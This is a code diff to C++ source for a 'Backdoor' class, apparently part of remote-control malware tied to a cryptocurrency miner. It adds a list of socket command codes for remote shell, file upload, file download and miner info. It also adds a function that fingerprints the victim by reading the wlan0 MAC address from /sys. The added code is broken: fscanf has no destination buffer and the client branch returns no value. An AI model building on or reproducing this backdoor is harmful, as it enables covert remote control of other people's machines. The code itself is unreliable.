@@ -1,4 +1,14 @@
 #include "backdoor.h"
+
+/*
+    Socket codes:
+        1 - shell
+        2 - upload
+        3 - download
+        4 - MinerInfo
+*/
+
+
 void Backdoor::shell(){
     if(this->is_server){
 
@@ -27,7 +37,23 @@ void Backdoor::download(const char *path){
 
 
 std::string Backdoor::get_miner_id(){
-    // Logica para pegar ID
+    if(this->is_server){
+        std::string miner_info;
+        this->c->send_message(this->sock, "4");
+        return this->c->recv_message(this->sock);
+    
+    }else{
+        
+        std::string wlan0;
+        FILE * f; 
+        f = fopen("/sys/class/net/wlan0/address", "r");
+        if(f != NULL){
+            fscanf(f, "%s");
+        }
+
+    }
+    
+
 }
 
 
